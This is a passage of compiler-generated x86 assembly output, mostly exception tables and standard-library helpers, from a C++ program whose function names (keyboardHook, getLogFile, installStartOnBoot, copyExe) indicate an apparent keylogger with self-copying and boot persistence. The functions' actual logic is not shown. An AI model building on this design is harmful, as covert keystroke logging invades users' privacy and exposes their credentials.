__unwindtable$??0?$basic_iostream@DU?$char_traits@D@std@@@std@@QAE@PAV?$basic_streambuf@DU?$char_traits@D@std@@@1@@Z DD 0ffffffffH
	DD	FLAT:__unwindfunclet$??0?$basic_iostream@DU?$char_traits@D@std@@@std@@QAE@PAV?$basic_streambuf@DU?$char_traits@D@std@@@1@@Z$0
	DD	00H
	DD	FLAT:__unwindfunclet$??0?$basic_iostream@DU?$char_traits@D@std@@@std@@QAE@PAV?$basic_streambuf@DU?$char_traits@D@std@@@1@@Z$1
__ehfuncinfo$??0?$basic_iostream@DU?$char_traits@D@std@@@std@@QAE@PAV?$basic_streambuf@DU?$char_traits@D@std@@@1@@Z DD 019930522H
	DD	02H
	DD	FLAT:__unwindtable$??0?$basic_iostream@DU?$char_traits@D@std@@@std@@QAE@PAV?$basic_streambuf@DU?$char_traits@D@std@@@1@@Z
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	016H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__unwindtable$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ DD 0ffffffffH
	DD	FLAT:__unwindfunclet$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ$0
__ehfuncinfo$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ DD 019930522H
	DD	01H
	DD	FLAT:__unwindtable$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	016H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__catchsym$?write@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@PBD_J@Z$3 DD 040H
	DD	00H
	DD	00H
	DD	FLAT:__catch$?write@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@PBD_J@Z$0
__tryblocktable$?write@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@PBD_J@Z DD 01H
	DD	01H
	DD	02H
	DD	01H
	DD	FLAT:__catchsym$?write@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@PBD_J@Z$3
__unwindtable$?write@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@PBD_J@Z DD 0ffffffffH
	DD	FLAT:__unwindfunclet$?write@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@PBD_J@Z$2
	DD	00H
	DD	00H
	DD	00H
	DD	00H
__ehfuncinfo$?write@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@PBD_J@Z DD 019930522H
	DD	03H
	DD	FLAT:__unwindtable$?write@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@PBD_J@Z
	DD	01H
	DD	FLAT:__tryblocktable$?write@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@PBD_J@Z
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	09H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__catchsym$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ$2 DD 040H
	DD	00H
	DD	00H
	DD	FLAT:__catch$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ$0
__unwindtable$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ DD 0ffffffffH
	DD	00H
	DD	0ffffffffH
	DD	00H
__tryblocktable$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ DD 00H
	DD	00H
	DD	01H
	DD	01H
	DD	FLAT:__catchsym$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ$2
__ehfuncinfo$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ DD 019930522H
	DD	02H
	DD	FLAT:__unwindtable$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ
	DD	01H
	DD	FLAT:__tryblocktable$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	02aH
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__unwindtable$??0?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@W4_Uninitialized@1@_N@Z DD 0ffffffffH
	DD	FLAT:__unwindfunclet$??0?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@W4_Uninitialized@1@_N@Z$0
__ehfuncinfo$??0?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@W4_Uninitialized@1@_N@Z DD 019930522H
	DD	01H
	DD	FLAT:__unwindtable$??0?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@W4_Uninitialized@1@_N@Z
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	02aH
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__unwindtable$??0?$basic_istream@DU?$char_traits@D@std@@@std@@QAE@PAV?$basic_streambuf@DU?$char_traits@D@std@@@1@_N@Z DD 0ffffffffH
	DD	FLAT:__unwindfunclet$??0?$basic_istream@DU?$char_traits@D@std@@@std@@QAE@PAV?$basic_streambuf@DU?$char_traits@D@std@@@1@_N@Z$0
__ehfuncinfo$??0?$basic_istream@DU?$char_traits@D@std@@@std@@QAE@PAV?$basic_streambuf@DU?$char_traits@D@std@@@1@_N@Z DD 019930522H
	DD	01H
	DD	FLAT:__unwindtable$??0?$basic_istream@DU?$char_traits@D@std@@@std@@QAE@PAV?$basic_streambuf@DU?$char_traits@D@std@@@1@_N@Z
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	09H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__ehfuncinfo$?swap@?$basic_ios@DU?$char_traits@D@std@@@std@@QAEXAAV12@@Z DD 019930522H
	DD	00H
	DD	00H
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	05H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	016H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__unwindtable$?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEDD@Z DD 0ffffffffH
	DD	FLAT:__unwindfunclet$?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEDD@Z$0
__ehfuncinfo$?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEDD@Z DD 019930522H
	DD	01H
	DD	FLAT:__unwindtable$?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEDD@Z
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
xdata$x	SEGMENT
__unwindtable$_main DD 0ffffffffH
	DD	FLAT:__unwindfunclet$_main$0
__unwindtable$?copyExe@@YAXXZ DD 0ffffffffH
	DD	FLAT:__unwindfunclet$?copyExe@@YAXXZ$0
__unwindtable$?getNewFileName@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@XZ DD 0ffffffffH
	DD	FLAT:__unwindfunclet$?getNewFileName@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@XZ$0
__unwindtable$?getInstallDirectory@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@XZ DD 0ffffffffH
	DD	FLAT:__unwindfunclet$?getInstallDirectory@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@XZ$0
__unwindtable$?getLogFile@@YA?AV?$basic_fstream@DU?$char_traits@D@std@@@std@@XZ DD 0ffffffffH
	DD	FLAT:__unwindfunclet$?getLogFile@@YA?AV?$basic_fstream@DU?$char_traits@D@std@@@std@@XZ$0
	DD	00H
	DD	FLAT:__unwindfunclet$?getLogFile@@YA?AV?$basic_fstream@DU?$char_traits@D@std@@@std@@XZ$1
__ehfuncinfo$_main DD 019930522H
	DD	01H
	DD	FLAT:__unwindtable$_main
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
__ehfuncinfo$?getLogFile@@YA?AV?$basic_fstream@DU?$char_traits@D@std@@@std@@XZ DD 019930522H
	DD	02H
	DD	FLAT:__unwindtable$?getLogFile@@YA?AV?$basic_fstream@DU?$char_traits@D@std@@@std@@XZ
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
__ehfuncinfo$?copyExe@@YAXXZ DD 019930522H
	DD	01H
	DD	FLAT:__unwindtable$?copyExe@@YAXXZ
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
__ehfuncinfo$?getNewFileName@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@XZ DD 019930522H
	DD	01H
	DD	FLAT:__unwindtable$?getNewFileName@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@XZ
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
__ehfuncinfo$?getInstallDirectory@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@XZ DD 019930522H
	DD	01H
	DD	FLAT:__unwindtable$?getInstallDirectory@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@XZ
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
voltbl	SEGMENT
_volmd	DD	0ffffffffH
	DDSymXIndex: 	FLAT:__unwindfunclet$_main$0
	DD	019H
_volmd	DD	0ffffffffH
	DDSymXIndex: 	FLAT:?keyboardHook@@YGJHIJ@Z
	DD	0dH
	DD	0133H
_volmd	DD	0ffffffffH
	DDSymXIndex: 	FLAT:__unwindfunclet$?getLogFile@@YA?AV?$basic_fstream@DU?$char_traits@D@std@@@std@@XZ$0
	DD	021H
	DD	02eH
_volmd	DD	0ffffffffH
	DDSymXIndex: 	FLAT:?getLogFile@@YA?AV?$basic_fstream@DU?$char_traits@D@std@@@std@@XZ
	DD	01eH
	DD	0b7H
_volmd	DD	0ffffffffH
	DDSymXIndex: 	FLAT:?installStartOnBoot@@YAXXZ
	DD	0dH
	DD	068H
_volmd	DD	0ffffffffH
	DDSymXIndex: 	FLAT:__unwindfunclet$?copyExe@@YAXXZ$0
	DD	016H
	DD	020H
_volmd	DD	0ffffffffH
	DDSymXIndex: 	FLAT:?copyExe@@YAXXZ
	DD	01bH
	DD	0abH
_volmd	DD	0ffffffffH
	DDSymXIndex: 	FLAT:?createInstallDirectory@@YAXXZ
	DD	0dH
	DD	044H
_volmd	DD	0ffffffffH
	DDSymXIndex: 	FLAT:__unwindfunclet$?getNewFileName@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@XZ$0
	DD	016H
	DD	020H
_volmd	DD	0ffffffffH
	DDSymXIndex: 	FLAT:?getNewFileName@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@XZ
	DD	01bH
	DD	076H
_volmd	DD	0ffffffffH
	DDSymXIndex: 	FLAT:__unwindfunclet$?getInstallDirectory@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@XZ$0
	DD	019H
	DD	026H
_volmd	DD	0ffffffffH
	DDSymXIndex: 	FLAT:?getInstallDirectory@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@XZ
	DD	01eH
	DD	0aaH
_volmd	DD	0ffffffffH
	DDSymXIndex: 	FLAT:?getOriginalFileName@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@XZ
	DD	010H
	DD	073H
voltbl	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	09H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__ehfuncinfo$??1ios_base@std@@UAE@XZ DD 019930522H
	DD	00H
	DD	00H
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	05H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	01eH
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__unwindtable$??$use_facet@V?$ctype@D@std@@@std@@YAABV?$ctype@D@0@ABVlocale@0@@Z DD 0ffffffffH
	DD	FLAT:__unwindfunclet$??$use_facet@V?$ctype@D@std@@@std@@YAABV?$ctype@D@0@ABVlocale@0@@Z$0
	DD	00H
	DD	FLAT:__unwindfunclet$??$use_facet@V?$ctype@D@std@@@std@@YAABV?$ctype@D@0@ABVlocale@0@@Z$1
__ehfuncinfo$??$use_facet@V?$ctype@D@std@@@std@@YAABV?$ctype@D@0@ABVlocale@0@@Z DD 019930522H
	DD	02H
	DD	FLAT:__unwindtable$??$use_facet@V?$ctype@D@std@@@std@@YAABV?$ctype@D@0@ABVlocale@0@@Z
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	034H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__unwindtable$?_Getcat@?$ctype@D@std@@SAIPAPBVfacet@locale@2@PBV42@@Z DD 0ffffffffH
	DD	FLAT:__unwindfunclet$?_Getcat@?$ctype@D@std@@SAIPAPBVfacet@locale@2@PBV42@@Z$0
	DD	00H
	DD	FLAT:__unwindfunclet$?_Getcat@?$ctype@D@std@@SAIPAPBVfacet@locale@2@PBV42@@Z$1
	DD	0ffffffffH
	DD	FLAT:__unwindfunclet$?_Getcat@?$ctype@D@std@@SAIPAPBVfacet@locale@2@PBV42@@Z$1
__ehfuncinfo$?_Getcat@?$ctype@D@std@@SAIPAPBVfacet@locale@2@PBV42@@Z DD 019930522H
	DD	03H
	DD	FLAT:__unwindtable$?_Getcat@?$ctype@D@std@@SAIPAPBVfacet@locale@2@PBV42@@Z
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	016H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__unwindtable$??0?$ctype@D@std@@QAE@ABV_Locinfo@1@I@Z DD 0ffffffffH
	DD	FLAT:__unwindfunclet$??0?$ctype@D@std@@QAE@ABV_Locinfo@1@I@Z$0
__ehfuncinfo$??0?$ctype@D@std@@QAE@ABV_Locinfo@1@I@Z DD 019930522H
	DD	01H
	DD	FLAT:__unwindtable$??0?$ctype@D@std@@QAE@ABV_Locinfo@1@I@Z
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	09H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__ehfuncinfo$??0locale@std@@QAE@XZ DD 019930522H
	DD	00H
	DD	00H
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	05H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	09H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__ehfuncinfo$??1_Locinfo@std@@QAE@XZ DD 019930522H
	DD	00H
	DD	00H
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	05H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	058H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__ehfuncinfo$??0_Locinfo@std@@QAE@PBD@Z DD 019930522H
	DD	07H
	DD	FLAT:__unwindtable$??0_Locinfo@std@@QAE@PBD@Z
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
__unwindtable$??0_Locinfo@std@@QAE@PBD@Z DD 0ffffffffH
	DD	FLAT:__unwindfunclet$??0_Locinfo@std@@QAE@PBD@Z$0
	DD	00H
	DD	FLAT:__unwindfunclet$??0_Locinfo@std@@QAE@PBD@Z$1
	DD	01H
	DD	FLAT:__unwindfunclet$??0_Locinfo@std@@QAE@PBD@Z$2
	DD	02H
	DD	FLAT:__unwindfunclet$??0_Locinfo@std@@QAE@PBD@Z$3
	DD	03H
	DD	FLAT:__unwindfunclet$??0_Locinfo@std@@QAE@PBD@Z$4
	DD	04H
	DD	FLAT:__unwindfunclet$??0_Locinfo@std@@QAE@PBD@Z$5
	DD	05H
	DD	FLAT:__unwindfunclet$??0_Locinfo@std@@QAE@PBD@Z$6
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	016H
	DB	020H
voltbl	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	01bH
	DB	06fH
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__unwindtable$??0system_error@std@@QAE@Verror_code@1@PBD@Z DD 0ffffffffH
	DD	FLAT:__unwindfunclet$??0system_error@std@@QAE@Verror_code@1@PBD@Z$0
__ehfuncinfo$??0system_error@std@@QAE@Verror_code@1@PBD@Z DD 019930522H
	DD	01H
	DD	FLAT:__unwindtable$??0system_error@std@@QAE@Verror_code@1@PBD@Z
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	016H
	DB	020H
voltbl	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	01bH
	DB	097H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__unwindtable$??0_System_error@std@@IAE@Verror_code@1@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z DD 0ffffffffH
	DD	FLAT:__unwindfunclet$??0_System_error@std@@IAE@Verror_code@1@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z$1
__ehfuncinfo$??0_System_error@std@@IAE@Verror_code@1@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z DD 019930522H
	DD	01H
	DD	FLAT:__unwindtable$??0_System_error@std@@IAE@Verror_code@1@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	01eH
	DB	028H
voltbl	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	01bH
	DB	0abH
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__unwindtable$?_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z DD 0ffffffffH
	DD	FLAT:__unwindfunclet$?_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z$0
	DD	00H
	DD	FLAT:__unwindfunclet$?_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z$1
__ehfuncinfo$?_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z DD 019930522H
	DD	02H
	DD	FLAT:__unwindtable$?_Makestr@_System_error@std@@CA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@Verror_code@2@V32@@Z
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	09H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__ehfuncinfo$?_Tidy_deallocate@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXXZ DD 019930522H
	DD	00H
	DD	00H
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	05H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	09H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__ehfuncinfo$?_Take_contents@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXAAV12@@Z DD 019930522H
	DD	00H
	DD	00H
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	05H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	016H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__unwindtable$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBD@Z DD 0ffffffffH
	DD	FLAT:__unwindfunclet$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBD@Z$0
__ehfuncinfo$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBD@Z DD 019930522H
	DD	01H
	DD	FLAT:__unwindtable$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBD@Z
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	016H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__unwindtable$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBDI@Z DD 0ffffffffH
	DD	FLAT:__unwindfunclet$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBDI@Z$0
__ehfuncinfo$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBDI@Z DD 019930522H
	DD	01H
	DD	FLAT:__unwindtable$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@QBDI@Z
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	016H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__unwindtable$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@ABV01@@Z DD 0ffffffffH
	DD	FLAT:__unwindfunclet$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@ABV01@@Z$0
__ehfuncinfo$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@ABV01@@Z DD 019930522H
	DD	01H
	DD	FLAT:__unwindtable$??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@ABV01@@Z
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
CRT$XCU	SEGMENT
?logfileHandle$initializer$@@3P6AXXZA DD FLAT:??__ElogfileHandle@@YAXXZ ; logfileHandle$initializer$
CRT$XCU	ENDS
;	COMDAT CRT$XCU
CRT$XCU	SEGMENT
??id$initializer$@?$codecvt@DDU_Mbstatet@@@std@@2P6AXXZA@@3P6AXXZA DD FLAT:??__E?id@?$codecvt@DDU_Mbstatet@@@std@@2V0locale@2@A@@YAXXZ ; ??id$initializer$@?$codecvt@DDU_Mbstatet@@@std@@2P6AXXZA@@3P6AXXZA
CRT$XCU	ENDS
; Function compile flags: /Odsp
;	COMDAT ??_E?$basic_fstream@DU?$char_traits@D@std@@@std@@$4PPPPPPPM@A@AEPAXI@Z
_TEXT	SEGMENT
??_E?$basic_fstream@DU?$char_traits@D@std@@@std@@$4PPPPPPPM@A@AEPAXI@Z PROC ; std::basic_fstream<char,std::char_traits<char> >::`vector deleting destructor', COMDAT
	sub	ecx, DWORD PTR [ecx-4]
	jmp	??_E?$basic_fstream@DU?$char_traits@D@std@@@std@@UAEPAXI@Z
??_E?$basic_fstream@DU?$char_traits@D@std@@@std@@$4PPPPPPPM@A@AEPAXI@Z ENDP ; std::basic_fstream<char,std::char_traits<char> >::`vector deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??_E?$basic_iostream@DU?$char_traits@D@std@@@std@@$4PPPPPPPM@A@AEPAXI@Z
_TEXT	SEGMENT
??_E?$basic_iostream@DU?$char_traits@D@std@@@std@@$4PPPPPPPM@A@AEPAXI@Z PROC ; std::basic_iostream<char,std::char_traits<char> >::`vector deleting destructor', COMDAT
	sub	ecx, DWORD PTR [ecx-4]
	jmp	??_E?$basic_iostream@DU?$char_traits@D@std@@@std@@UAEPAXI@Z
??_E?$basic_iostream@DU?$char_traits@D@std@@@std@@$4PPPPPPPM@A@AEPAXI@Z ENDP ; std::basic_iostream<char,std::char_traits<char> >::`vector deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??_E?$basic_ostream@DU?$char_traits@D@std@@@std@@$4PPPPPPPM@A@AEPAXI@Z
_TEXT	SEGMENT
??_E?$basic_ostream@DU?$char_traits@D@std@@@std@@$4PPPPPPPM@A@AEPAXI@Z PROC ; std::basic_ostream<char,std::char_traits<char> >::`vector deleting destructor', COMDAT
	sub	ecx, DWORD PTR [ecx-4]
	jmp	??_E?$basic_ostream@DU?$char_traits@D@std@@@std@@UAEPAXI@Z
??_E?$basic_ostream@DU?$char_traits@D@std@@@std@@$4PPPPPPPM@A@AEPAXI@Z ENDP ; std::basic_ostream<char,std::char_traits<char> >::`vector deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??_E?$basic_istream@DU?$char_traits@D@std@@@std@@$4PPPPPPPM@A@AEPAXI@Z
_TEXT	SEGMENT
??_E?$basic_istream@DU?$char_traits@D@std@@@std@@$4PPPPPPPM@A@AEPAXI@Z PROC ; std::basic_istream<char,std::char_traits<char> >::`vector deleting destructor', COMDAT
	sub	ecx, DWORD PTR [ecx-4]
	jmp	??_E?$basic_istream@DU?$char_traits@D@std@@@std@@UAEPAXI@Z
??_E?$basic_istream@DU?$char_traits@D@std@@@std@@$4PPPPPPPM@A@AEPAXI@Z ENDP ; std::basic_istream<char,std::char_traits<char> >::`vector deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$forward@AAPAV_Facet_base@std@@@std@@YAAAPAV_Facet_base@0@AAPAV10@@Z
_TEXT	SEGMENT
__Arg$ = 8						; size = 4
??$forward@AAPAV_Facet_base@std@@@std@@YAAAPAV_Facet_base@0@AAPAV10@@Z PROC ; std::forward<std::_Facet_base * &>, COMDAT
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\type_traits
; Line 1443
	push	ebp
	mov	ebp, esp
; Line 1444
	mov	eax, DWORD PTR __Arg$[ebp]
; Line 1445
	pop	ebp
	ret	0
??$forward@AAPAV_Facet_base@std@@@std@@YAAAPAV_Facet_base@0@AAPAV10@@Z ENDP ; std::forward<std::_Facet_base * &>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??$?0AAPAV_Facet_base@std@@@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PAV_Facet_base@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@AAPAV_Facet_base@1@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___formal$ = 8						; size = 1
_<_Val2_0>$ = 12					; size = 4
??$?0AAPAV_Facet_base@std@@@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PAV_Facet_base@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@AAPAV_Facet_base@1@@Z PROC ; std::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1>::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1><std::_Facet_base * &>, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.29.30133\include\xmemory
; Line 1390
	push	ebp
	mov	ebp, esp
	push	ecx
	mov	DWORD PTR _this$[ebp], ecx
	push	DWORD PTR _<_Val2_0>$[ebp]
	call	??$forward@AAPAV_Facet_base@std@@@std@@YAAAPAV_Facet_base@0@AAPAV10@@Z ; std::forward<std::_Facet_base * &>
	pop	ecx
	mov	ecx, DWORD PTR _this$[ebp]
	mov	eax, DWORD PTR [eax]
	mov	DWORD PTR [ecx], eax
	mov	eax, DWORD PTR _this$[ebp]
	leave
	ret	8
??$?0AAPAV_Facet_base@std@@@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PAV_Facet_base@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@AAPAV_Facet_base@1@@Z ENDP ; std::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1>::_Compressed_pair<std::default_delete<std::_Facet_base>,std::_Facet_base *,1><std::_Facet_base * &>
_TEXT	ENDS
; Function compile flags: /Odsp
;	COMDAT ??__E?id@?$codecvt@DDU_Mbstatet@@@std@@2V0locale@2@A@@YAXXZ
text$di	SEGMENT
